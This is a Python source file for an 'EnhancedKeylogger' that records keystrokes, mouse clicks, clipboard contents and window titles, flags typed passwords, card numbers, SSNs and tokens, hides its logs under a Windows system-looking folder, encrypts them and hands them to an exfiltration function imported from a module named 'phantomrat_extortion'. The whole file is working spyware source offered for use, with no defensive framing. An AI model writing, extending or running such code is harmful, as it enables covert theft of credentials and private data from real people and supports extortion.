import pynput.keyboard as keyboard
import pynput.mouse as mouse
import time
import json
import threading
import os
import base64
from cryptography.fernet import Fernet
import queue

class EnhancedKeylogger:
    def __init__(self, max_log_size=10000, encryption_key=None):
        """
        Enhanced keylogger with mouse tracking, clipboard monitoring, and encryption
        """
        self.log_buffer = []
        self.max_log_size = max_log_size
        self.is_logging = False
        self.keyboard_listener = None
        self.mouse_listener = None
        self.clipboard_data = []
        self.screenshots = []
        self.window_titles = []
        
        # Encryption
        if encryption_key:
            self.fernet = Fernet(encryption_key)
            self.encryption_enabled = True
        else:
            self.encryption_enabled = False
        
        # Thread-safe queue for log entries
        self.log_queue = queue.Queue()
        self.processor_thread = None
        
        # Stats
        self.stats = {
            'keys_pressed': 0,
            'clicks': 0,
            'windows_tracked': 0,
            'start_time': time.time()
        }
        
        # Application-specific logging
        self.sensitive_apps = [
            'chrome', 'firefox', 'edge', 'explorer', 'outlook',
            'teams', 'slack', 'discord', 'whatsapp', 'telegram'
        ]
        
        # Keywords to watch for
        self.sensitive_keywords = [
            'password', 'login', 'username', 'email', 'credit',
            'card', 'bank', 'account', 'secret', 'token', 'key',
            'passphrase', 'pin', 'ssn', 'social security'
        ]

    def start_processing(self):
        """Start background thread to process logs"""
        def process_loop():
            while self.is_logging:
                try:
                    # Process items from queue
                    while not self.log_queue.empty():
                        log_entry = self.log_queue.get_nowait()
                        self.process_log_entry(log_entry)
                        self.log_queue.task_done()
                    
                    # Flush buffer periodically
                    if len(self.log_buffer) > self.max_log_size * 0.8:
                        self.flush_logs()
                    
                    time.sleep(0.1)
                except:
                    time.sleep(1)
        
        self.processor_thread = threading.Thread(target=process_loop, daemon=True)
        self.processor_thread.start()

    def process_log_entry(self, entry):
        """Process and categorize log entries"""
        # Add timestamp if not present
        if 'timestamp' not in entry:
            entry['timestamp'] = time.time()
        
        # Check for sensitive content
        if entry['type'] == 'key' and 'char' in entry:
            text = entry['char'].lower()
            for keyword in self.sensitive_keywords:
                if keyword in text:
                    entry['sensitive'] = True
                    self.trigger_alert(f"Sensitive keyword detected: {keyword}")
                    break
        
        # Add to buffer
        self.log_buffer.append(entry)
        self.stats['keys_pressed'] += 1

    def on_key_press(self, key):
        """Handle key press events"""
        try:
            entry = {
                'type': 'key',
                'action': 'press',
                'timestamp': time.time(),
                'key': str(key),
                'char': key.char if hasattr(key, 'char') else None,
                'app': self.get_active_window()
            }
            
            # Special keys
            if key == keyboard.Key.enter:
                entry['char'] = '[ENTER]'
            elif key == keyboard.Key.tab:
                entry['char'] = '[TAB]'
            elif key == keyboard.Key.space:
                entry['char'] = ' '
            elif key == keyboard.Key.backspace:
                entry['char'] = '[BACKSPACE]'
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                entry['char'] = '[CTRL]'
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                entry['char'] = '[ALT]'
            elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
                entry['char'] = '[CMD]'
            
            self.log_queue.put(entry)
            
        except Exception as e:
            print(f"Key press error: {e}")

    def on_key_release(self, key):
        """Handle key release events"""
        try:
            entry = {
                'type': 'key',
                'action': 'release',
                'timestamp': time.time(),
                'key': str(key)
            }
            self.log_queue.put(entry)
        except:
            pass

    def on_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        try:
            entry = {
                'type': 'mouse',
                'action': 'click',
                'button': str(button),
                'pressed': pressed,
                'x': x,
                'y': y,
                'timestamp': time.time(),
                'app': self.get_active_window()
            }
            
            if pressed:
                self.stats['clicks'] += 1
            
            self.log_queue.put(entry)
        except:
            pass

    def on_scroll(self, x, y, dx, dy):
        """Handle mouse scroll events"""
        try:
            entry = {
                'type': 'mouse',
                'action': 'scroll',
                'x': x,
                'y': y,
                'dx': dx,
                'dy': dy,
                'timestamp': time.time()
            }
            self.log_queue.put(entry)
        except:
            pass

    def monitor_clipboard(self):
        """Monitor clipboard for sensitive data"""
        import pyperclip
        
        last_clipboard = ""
        
        def clipboard_loop():
            nonlocal last_clipboard
            while self.is_logging:
                try:
                    current = pyperclip.paste()
                    if current != last_clipboard and current.strip():
                        entry = {
                            'type': 'clipboard',
                            'content': current[:500],  # Limit size
                            'timestamp': time.time(),
                            'app': self.get_active_window()
                        }
                        
                        # Check for sensitive clipboard content
                        content_lower = current.lower()
                        if any(keyword in content_lower for keyword in self.sensitive_keywords):
                            entry['sensitive'] = True
                            self.trigger_alert("Sensitive content in clipboard")
                        
                        self.clipboard_data.append(entry)
                        last_clipboard = current
                except:
                    pass
                
                time.sleep(1)
        
        clipboard_thread = threading.Thread(target=clipboard_loop, daemon=True)
        clipboard_thread.start()

    def get_active_window(self):
        """Get current active window title"""
        try:
            if os.name == 'nt':  # Windows
                import win32gui
                window = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(window)
            else:  # Linux/macOS
                import subprocess
                result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                      capture_output=True, text=True)
                title = result.stdout.strip()
            
            if title and title not in self.window_titles:
                self.window_titles.append(title)
                self.stats['windows_tracked'] += 1
            
            return title
        except:
            return "Unknown"

    def capture_keystroke_context(self):
        """Capture context around keystrokes (what application, etc.)"""
        # This would be called periodically or on app switch
        current_window = self.get_active_window()
        
        if current_window:
            entry = {
                'type': 'context',
                'window': current_window,
                'timestamp': time.time()
            }
            self.log_queue.put(entry)

    def trigger_alert(self, message):
        """Trigger alert for sensitive activity"""
        alert_entry = {
            'type': 'alert',
            'message': message,
            'timestamp': time.time(),
            'level': 'high'
        }
        self.log_buffer.append(alert_entry)
        
        # Could also trigger immediate exfiltration here
        # self.flush_logs()

    def flush_logs(self):
        """Flush logs to storage/exfiltration"""
        if not self.log_buffer:
            return
        
        # Prepare log data
        log_data = {
            'logs': self.log_buffer.copy(),
            'stats': self.stats.copy(),
            'clipboard': self.clipboard_data[-50:],  # Last 50 clipboard entries
            'windows': self.window_titles[-20:],     # Last 20 windows
            'timestamp': time.time()
        }
        
        # Encrypt if enabled
        if self.encryption_enabled:
            log_json = json.dumps(log_data).encode()
            encrypted = self.fernet.encrypt(log_json)
            log_data = {'encrypted': base64.b64encode(encrypted).decode()}
        
        # Save locally
        self.save_local(log_data)
        
        # Prepare for exfiltration
        self.prepare_exfiltration(log_data)
        
        # Clear buffer
        self.log_buffer.clear()
        
        # Keep last 100 entries for context
        if len(self.log_buffer) > 100:
            self.log_buffer = self.log_buffer[-100:]

    def save_local(self, log_data):
        """Save logs locally with rotation"""
        log_dir = self.get_log_directory()
        os.makedirs(log_dir, exist_ok=True)
        
        # Create filename with timestamp
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(log_dir, f"keylog_{timestamp}.json")
        
        try:
            with open(filename, 'w') as f:
                json.dump(log_data, f, indent=2)
            
            # Keep only last 10 log files
            self.rotate_logs(log_dir, max_files=10)
        except Exception as e:
            print(f"Error saving logs: {e}")

    def get_log_directory(self):
        """Get appropriate log directory based on OS"""
        if os.name == 'nt':  # Windows
            return os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Logs')
        else:  # Linux/macOS
            return os.path.join(os.path.expanduser('~'), '.local', 'share', 'logs')

    def rotate_logs(self, log_dir, max_files=10):
        """Rotate log files to avoid disk space issues"""
        try:
            log_files = [f for f in os.listdir(log_dir) if f.startswith('keylog_')]
            log_files.sort(key=lambda x: os.path.getmtime(os.path.join(log_dir, x)))
            
            # Delete oldest files if over limit
            while len(log_files) > max_files:
                oldest = log_files.pop(0)
                os.remove(os.path.join(log_dir, oldest))
        except:
            pass

    def prepare_exfiltration(self, log_data):
        """Prepare logs for exfiltration"""
        # Compress if large
        import zlib
        log_json = json.dumps(log_data).encode()
        
        if len(log_json) > 1024:  # 1KB
            compressed = zlib.compress(log_json)
            if len(compressed) < len(log_json):
                log_data = {'compressed': base64.b64encode(compressed).decode()}
        
        # Queue for exfiltration
        from phantomrat_extortion import exfil_data
        try:
            exfil_data({'type': 'keylog', 'data': log_data})
        except:
            # Save for later exfiltration
            self.queue_for_later(log_data)

    def queue_for_later(self, data):
        """Queue data for later exfiltration"""
        queue_file = os.path.join(self.get_log_directory(), 'pending_exfil.json')
        
        try:
            pending = []
            if os.path.exists(queue_file):
                with open(queue_file, 'r') as f:
                    pending = json.load(f)
            
            pending.append(data)
            
            with open(queue_file, 'w') as f:
                json.dump(pending[:100], f)  # Keep max 100 pending
            
        except:
            pass

    def start_logging(self):
        """Start all logging activities"""
        if self.is_logging:
            return False
        
        self.is_logging = True
        self.stats['start_time'] = time.time()
        
        # Start keyboard listener
        self.keyboard_listener = keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        )
        self.keyboard_listener.start()
        
        # Start mouse listener
        self.mouse_listener = mouse.Listener(
            on_click=self.on_click,
            on_scroll=self.on_scroll
        )
        self.mouse_listener.start()
        
        # Start clipboard monitoring
        try:
            self.monitor_clipboard()
        except:
            pass
        
        # Start processing thread
        self.start_processing()
        
        # Start periodic context capture
        self.start_context_capture()
        
        print(f"[+] Keylogger started at {time.ctime()}")
        return True

    def start_context_capture(self):
        """Start periodic context capture"""
        def context_capture_loop():
            while self.is_logging:
                self.capture_keystroke_context()
                time.sleep(30)  # Every 30 seconds
        
        threading.Thread(target=context_capture_loop, daemon=True).start()

    def stop_logging(self):
        """Stop all logging activities"""
        if not self.is_logging:
            return
        
        self.is_logging = False
        
        # Stop listeners
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        
        if self.mouse_listener:
            self.mouse_listener.stop()
        
        # Flush remaining logs
        self.flush_logs()
        
        # Wait for processor thread
        if self.processor_thread:
            self.processor_thread.join(timeout=5)
        
        print(f"[+] Keylogger stopped. Logged {self.stats['keys_pressed']} keystrokes.")

    def get_log(self, max_entries=1000):
        """Get recent log entries"""
        # Return recent entries
        recent = self.log_buffer[-max_entries:] if self.log_buffer else []
        
        # Add stats
        result = {
            'recent_entries': recent,
            'stats': self.stats,
            'clipboard_samples': self.clipboard_data[-10:],
            'active_windows': self.window_titles[-10:]
        }
        
        return result

    def get_encrypted_log(self):
        """Get encrypted log data"""
        log_data = self.get_log()
        
        if self.encryption_enabled:
            log_json = json.dumps(log_data).encode()
            encrypted = self.fernet.encrypt(log_json)
            return base64.b64encode(encrypted).decode()
        
        return json.dumps(log_data)

    def clear_logs(self):
        """Clear all logs"""
        self.log_buffer.clear()
        self.clipboard_data.clear()
        self.window_titles.clear()
        self.stats = {
            'keys_pressed': 0,
            'clicks': 0,
            'windows_tracked': 0,
            'start_time': time.time()
        }

# Utility function to generate encryption key
def generate_encryption_key():
    """Generate Fernet encryption key"""
    return Fernet.generate_key()

# Singleton instance for easy access
_keylogger_instance = None

def get_keylogger(key=None):
    """Get or create keylogger instance"""
    global _keylogger_instance
    if _keylogger_instance is None:
        _keylogger_instance = EnhancedKeylogger(encryption_key=key)
    return _keylogger_instance

if __name__ == "__main__":
    # Test the keylogger
    print("Testing Enhanced Keylogger...")
    
    # Generate encryption key
    key = generate_encryption_key()
    print(f"Encryption key: {key.decode()[:20]}...")
    
    # Create keylogger
    kl = EnhancedKeylogger(encryption_key=key)
    
    # Start logging
    kl.start_logging()
    
    print("Keylogger started. Press Ctrl+C to stop.")
    
    try:
        # Run for 30 seconds
        import time
        for i in range(30):
            print(f"\rRunning... {30-i} seconds remaining", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        # Stop logging
        kl.stop_logging()
        
        # Show stats
        stats = kl.stats
        print(f"\n\nStats:")
        print(f"  Keys pressed: {stats['keys_pressed']}")
        print(f"  Mouse clicks: {stats['clicks']}")
        print(f"  Windows tracked: {stats['windows_tracked']}")
        print(f"  Duration: {time.time() - stats['start_time']:.1f} seconds")
        
        # Show sample log
        sample = kl.get_log(max_entries=5)
        print(f"\nSample log entries:")
        for entry in sample.get('recent_entries', [])[:3]:
            if entry['type'] == 'key' and 'char' in entry:
                print(f"  [{entry.get('app', 'Unknown')}] {entry.get('char', '')}")

